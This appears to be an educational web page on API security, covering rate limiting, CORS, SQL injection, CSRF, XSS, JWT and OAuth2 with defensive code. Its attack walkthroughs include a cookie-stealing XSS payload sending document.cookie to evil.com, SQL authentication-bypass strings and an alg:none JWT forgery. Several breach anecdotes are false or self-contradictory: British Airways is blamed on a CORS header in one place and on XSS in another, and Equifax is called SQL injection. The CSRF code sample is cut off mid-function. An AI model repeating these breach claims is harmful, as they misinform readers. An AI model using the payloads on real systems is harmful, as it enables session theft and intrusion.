🚦 The Dam: Rate Limiting

Uncontrolled Traffic
Floods Your Pipeline

Without rate limiting, a single bot can drain your server, brute-force credentials, or scrape your entire database — in seconds.

Rate limiting enforces request quotas per client, IP, or API key within a sliding time window. It's your first line of defense against brute-force attacks, credential stuffing, DDoS, and excessive scraping. Without it, your compute and your data are unlimited free resources for attackers.

⚔ Attack Progression
Bot deployed — attacker spins up thousands of concurrent requests to /api/login
Credential stuffing — leaked password lists tested at machine speed, ~10k req/min
Server overwhelmed — legitimate users get 503s, revenue impact begins immediately
Rate limiter fires — 429 Too Many Requests, attacker IP blocked, exponential backoff applied
🛡 Algorithms
  • Token Bucket (burst-friendly)
  • Sliding Window Counter
  • Fixed Window (simplest)
  • Leaky Bucket (smooth output)
  • Redis for distributed state
⚖ Trade-offs
  • ✓ Stops brute-force cold
  • ✓ Prevents DDoS amplification
  • ✓ Reduces infra cost
  • ✗ Can block power users
  • ✗ Needs per-endpoint tuning
Real-World Breach
Krebs on Security 2016 — Mirai botnet generated 620 Gbps against OVH using IoT devices. No rate limiting at the edge layer meant the attack bypassed all application defenses. Modern mitigation requires rate limiting at CDN, load balancer, and API gateway levels simultaneously.

Node.js + express-rate-limit ✓ Secure
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';

// Strict limit for auth endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 min
  max: 10, // 10 attempts max
  store: new RedisStore({ client }),
  handler: (req, res) => {
    res.status(429).json({
      error: 'Too many attempts',
      retryAfter: res.getHeader('Retry-After')
    });
  }
});

app.use('/api/auth', authLimiter);

🌐 The Guest List: CORS

Cross-Origin Resource
Sharing — Done Right

Cross-Origin Resource Sharing is the protocol that defines who gets in to your API's VIP area. It's the diplomatic corps of the internet.

CORS is a browser-enforced security mechanism restricting which origins can read responses from your API. Misconfigured CORS — especially Access-Control-Allow-Origin: * with credentials — lets any malicious site silently read your users' private data using their own authenticated sessions.

⚔ Wildcard Exploit Chain
Victim authenticated — logged into yourbank.com, session cookie present
Evil.com visited — attacker's site triggers fetch('https://yourbank.com/api/balance')
Wildcard permits it — Access-Control-Allow-Origin: * allows the cross-origin read
Data exfiltrated — account balances, PII, tokens extracted silently
🛡 Best Practices
  • Explicit origin allowlist always
  • Never wildcard (*) with credentials
  • Restrict Allow-Methods tightly
  • Validate Origin server-side
  • Review on every deploy
🔍 Headers to Set
  • Access-Control-Allow-Origin
  • Access-Control-Allow-Methods
  • Access-Control-Allow-Headers
  • Access-Control-Max-Age
  • Vary: Origin (caching!)
Real-World Breach
British Airways 2018 — Magecart exploited CORS misconfiguration to exfiltrate payment data from 500k customers over 15 days undetected. The £183M GDPR fine resulted from a single wildcard CORS header on the checkout API. Always audit third-party script access to your API origins.

Express.js ✓ Secure
// Explicit allowlist — never use '*'
const allowedOrigins = [
  'https://app.yourco.com',
  'https://admin.yourco.com',
];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin))
      callback(null, true);
    else callback(new Error('CORS: Origin blocked'));
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT'],
}));

💉 The Poisoned Query: SQLi

When User Input
Becomes a Weapon

SQL Injection has topped the OWASP list for decades. One unsanitized string hands an attacker the keys to your entire database kingdom.

SQLi occurs when attacker-controlled input is interpolated directly into database queries. The injected SQL alters query logic — bypassing authentication, extracting arbitrary tables, modifying records, or executing OS commands via xp_cmdshell on SQL Server. It's consistently the most damaging vulnerability class by breach cost.

⚔ Authentication Bypass
Target identified — login form, search endpoint, user profile URL parameter
Payload crafted — admin'-- or ' OR '1'='1 injected into username field
Query broken — WHERE clause evaluates to TRUE for all rows
Admin access — first user (typically admin) returned without password check
🛡 Defenses
  • Parameterized queries (always)
  • Stored procedures with params
  • ORM with safe query builders
  • Input validation + allowlists
  • Least-privilege DB accounts
🎯 SQLi Variants
  • Classic in-band
  • Blind boolean-based
  • Time-based blind
  • Error-based extraction
  • Second-order injection
Real-World Breach
Equifax 2017 — SQLi combined with an unpatched Apache Struts CVE exposed 147 million Americans' SSNs, birth dates, and addresses. Settlement: $575M. A single parameterized query and a patched dependency would have prevented one of history's costliest breaches entirely.
💉 Query Comparison 🔴 Critical
❌ Vulnerable — String Concatenation
// username: admin'--
const q = `SELECT * FROM users
 WHERE user='${username}'
 AND pass='${password}'`;

// Becomes:
SELECT * FROM users WHERE
user='admin'--' AND pass='x'
// Auth bypassed ✓ (for attacker)
✅ Secure — Parameterized Query
// Input treated as pure data
const q = 'SELECT * FROM users
 WHERE user=? AND pass=?';

db.execute(q, [username, hashedPw]);
// Injection impossible — params escaped
Prisma ORM (TypeScript) ✓ Safe by default
// Prisma parameterizes automatically
const user = await prisma.user.findUnique({
  where: { email: userInput.email }
});

// Raw queries — use tagged template
const res = await prisma.
  $queryRaw`SELECT * FROM users
  WHERE id = ${userId}`; // Safe ✓

🎭 The Hijacked Session: CSRF

Cross-Site Request
Forgery

Cross-Site Request Forgery makes a victim's browser your unwitting accomplice — performing unauthorized actions as if they chose to.

CSRF exploits trust. Browsers automatically attach cookies to every request — including cross-origin ones. An attacker's page can silently POST to your API using the victim's authenticated session. No credentials needed. No user awareness. State-changing actions — transfers, password changes, email updates — all at risk.

⚔ Forged Request Chain
Victim authenticated — logged into bank.com, session cookie session=abc123 stored
Attacker lures victim — phishing email: "Your account needs verification" → evil.com
Hidden form fires — POST /transfer?to=attacker&amt=9999 auto-submitted on page load
Bank processes it — sees valid session cookie, executes transfer, victim none the wiser
🛡 Defenses
  • Synchronizer token pattern
  • SameSite=Strict on cookies
  • Double-submit cookie
  • Verify Origin/Referer header
  • Re-auth for sensitive ops
📋 Disable Cookies
  • Securely set HttpOnly
  • Set Secure flag (HTTPS)
  • SameSite=Lax minimum
  • SameSite=None → risk
  • withCredentials=true → audit
Real-World Breach
Netflix 2006 — CSRF allowed attackers to change victim email/password and hijack accounts. YouTube 2008 — mass-subscribe and auto-favorite attacks affected millions of accounts before the CSRF token fix was deployed. Both required zero victim interaction beyond clicking a link.

// Generate unique token per session
app.use(csrf({ cookie: true }));

app.get('/api/form-token', (req, res) => {

// Cookies: SameSite=Strict

⚡ The Trojan Script: XSS

Injecting Code That
Runs in Every Browser

XSS turns your trusted website into a malware delivery platform — running attacker scripts in your users' browsers with full page privileges.

Cross-Site Scripting injects malicious JavaScript into pages served to other users. Stored XSS persists in your database and fires for every visitor. Reflected XSS executes from URL parameters. DOM-based XSS manipulates client-side sinks. All three steal session cookies, log keystrokes, redirect users, and perform actions on victims' behalf — silently.

⚔ Stored XSS Attack
Attacker posts comment — <script>fetch('evil.com?c='+document.cookie)</script>
Stored without sanitization — raw HTML saved to database, no encoding applied
Every visitor triggers it — browser executes the script, session cookies exfiltrated to attacker
Account takeover — attacker uses stolen cookies to impersonate victims, no password needed
🛡 Defenses
  • Output encoding (always)
  • Content-Security-Policy header
  • DOMPurify for HTML input
  • HttpOnly cookie flag
  • Trusted Types API (Chrome)
🔍 XSS Types
  • Stored (Persistent)
  • Reflected (Non-persistent)
  • DOM-based (Client-side)
  • Blind XSS (hardest to catch)
  • Mutation XSS (mXSS)
Real-World Breach
Samy Worm 2005 — first XSS worm spread across MySpace to 1M profiles in 24 hours. Twitter StalkScan 2010 — stored XSS in tweet content propagated virally affecting thousands of accounts. British Airways 2018 — DOM-based XSS in checkout page used for 15-day Magecart payment skimming.

🔑 The Digital Passport: JWT

JSON Web Tokens —
The Right Way

JWTs are the digital passport to accessing countless services without re-submitting credentials. A stolen or forged passport is as dangerous as no security at all.

JWT vulnerabilities include: algorithm confusion attacks (alg:none bypass), weak signing secrets brutable in minutes, missing claim validation (exp, iss, aud), and tokens stored insecurely in localStorage (XSS vector). A properly implemented JWT is powerful — an improperly implemented one is a backdoor.

⚔ Common JWT Attack Vectors
Algorithm confusion — attacker changes header to "alg":"none", removes signature, server accepts if not validated
Weak secret brute-forced — jwt.secret or password123 cracked offline with hashcat in seconds
Missing exp validation — token never expires, stolen token grants permanent access
localStorage exposure — token readable by any JS on the page, XSS extracts it instantly
🛡 Secure JWT Checklist
  • Use RS256 (asymmetric) in prod
  • Validate alg, exp, iss, aud
  • Whitelist allowed algorithms
  • Store in HttpOnly cookie
  • Implement token revocation list
⚠ Common Mistakes
  • alg:none not blocked
  • HS256 with weak secret
  • Storing in localStorage
  • No exp claim set
  • Trusting JWT header alg
Real-World Exploit
Auth0 2016 — a critical algorithm confusion vulnerability allowed attackers to sign arbitrary JWTs using the public key as an HMAC secret. Any RS256 service could be completely bypassed. The fix: always specify and enforce algorithm in server-side verification, never trust the token's own alg header.
🔑 JWT Structure Inspector AUTHENTICATED
Header — Algorithm & Type
{ "alg": "RS256", "typ": "JWT" }
✓ Asymmetric — public key verifiable
Payload — Claims
{ "sub": "user_abc123",
  "iss": "https://auth.yourco.com",
  "aud": "https://api.yourco.com",
  "exp": 1735689600, ← Validate!
  "iat": 1735686000 }
Signature — RS256 signed
RSASHA256(base64(header) + "." + base64(payload), privateKey)
✓ Cannot be forged without private key
Node.js / jsonwebtoken ✓ Secure
// ALWAYS whitelist algorithms
const payload = jwt.verify(token, publicKey, {
  algorithms: ['RS256'], // whitelist!
  issuer: 'https://auth.yourco.com',
  audience: 'https://api.yourco.com',
});

🔐 The Sovereign Key: OAuth2 & OIDC

Delegate Access
Without Sharing Passwords

OAuth2 allows you to share more or less access across services without ever revealing your own passwords — if implemented correctly. Why OIDC adds identity verification on top.

OAuth2 is an authorization framework; OIDC (OpenID Connect) extends it with identity. Together they power "Login with Google/GitHub." Misconfigurations — open redirects, PKCE bypass, state parameter omission, token leakage in URLs — can lead to complete account takeover. Always use PKCE, validate state, and check token audience.

🔓 Access Scopes
  • read:profile (minimal)
  • write:posts (specific)
  • admin:org (privileged)
  • offline_access (long-lived)
  • * (never grant wildcard)
⚠ Critical Mistakes
  • Missing state parameter
  • Open redirect in redirect_uri
  • PKCE not enforced
  • Token in URL fragment
  • No scope restriction
Real-World Exploit
Facebook 2018 (50M accounts) — OAuth token theft via a "View As" feature combined with three separate bugs allowed attackers to harvest access tokens. The absence of binding tokens to client state made mass harvesting possible. Always bind tokens to device fingerprint and validate redirect_uri exactly.
🔐 OAuth2 PKCE Flow ✓ Secure Flow
1
App generates code_verifier (random 43-128 char string) + code_challenge (SHA256 hash)
2
Auth request sent with code_challenge, state (CSRF protection), scope
3
User authenticates at Authorization Server — grants permission
4
Auth code returned to redirect_uri — state validated server-side
5
Token exchange — code + code_verifier sent — server verifies PKCE, issues tokens
Node.js PKCE Generation ✓ RFC 7636
import { randomBytes, createHash } from 'crypto';

const verifier = randomBytes(32).toString('base64url');
const challenge = createHash('sha256')
  .update(verifier).digest('base64url');

Security Best
Practices Checklist

Battle-tested principles that secure teams embed into every API from day one. Not bolted on after a breach — built in from commit one.

01
🔒
Security Headers on Every Response
Every API response must include CSP, HSTS, X-Content-Type-Options, X-Frame-Options, Referrer-Policy, and Permissions-Policy. Use Helmet.js for Express, SecureHeaders for Python. Audit with securityheaders.com on every deploy.
Helmet.jsCSPHSTSsecurityheaders.com
02
✅
Schema-First Input Validation
Validate every incoming field against a strict schema — types, ranges, formats, maximum lengths. Reject malformed requests at the gateway with 400 errors before they touch business logic. Use Zod (TypeScript), Joi, or JSON Schema + ajv.
ZodJoiajvJSON Schema
03
🔑
Secrets Management — Zero Hardcoding
Never commit secrets. Use environment variables for dev, and a proper secrets manager (HashiCorp Vault, AWS Secrets Manager, Doppler) for production. Rotate credentials on a schedule, immediately after any suspected compromise, and on team member offboarding.
VaultAWS SMDopplergit-secrets
04
🏗
Least Privilege Everywhere
Every service, DB account, IAM role, and API key gets the minimum permissions for its specific function — nothing more. Scope OAuth tokens by resource and action. Run regular permission audits. Least privilege is the single highest-ROI security control.
RBACABACIAMOAuth Scopes
05
🔍
Security Testing in CI/CD
Integrate SAST (Semgrep, CodeQL), DAST (OWASP ZAP, Burp Suite API), and SCA (Snyk, Dependabot) into your pipeline. Block deploys on critical findings. Run pen tests quarterly. Security must be automated — manual reviews alone don't scale.
SemgrepOWASP ZAPSnykCodeQL
06
📋
Incident Response Runbooks
Define your runbooks before you need them. Who's on-call? What's the containment protocol? How do you communicate? Practice tabletop exercises quarterly. A rehearsed team responds in minutes — not days. That gap is millions of dollars and regulatory consequences.

More Security Domains

🎯
IDOR
Insecure Direct Object References
Changing /api/users/123 to /api/users/124 shouldn't expose another user's data. Always verify object ownership server-side, not just authentication. Use UUIDs, implement ABAC, and log all access attempts.
  • Verify ownership on every request
  • UUIDs over sequential integers
  • Attribute-based access control (ABAC)
  • Audit logs for all resource access
📦
Mass Assignment
Over-Posting / Mass Assignment
When APIs bind raw request body to model objects without a whitelist, attackers add {"role":"admin"} or {"verified":true} to requests. A single extra field can escalate privileges silently.
  • Explicit DTOs — never bind req.body directly
  • Whitelist allowed fields per endpoint
  • Use readonly decorators on sensitive fields
  • Audit all PATCH/PUT endpoints quarterly
🌊
NoSQL Injection
NoSQL & Command Injection
Injection isn't just SQL. MongoDB $where clauses, LDAP filters, OS commands via exec(), and XML parsers are equally dangerous. Validate and sanitize across every data layer.
  • Disable dangerous MongoDB operators ($where)
  • Never pass user input to exec() or eval()
  • Use parameterized NoSQL queries
  • Disable XXE in XML parsers
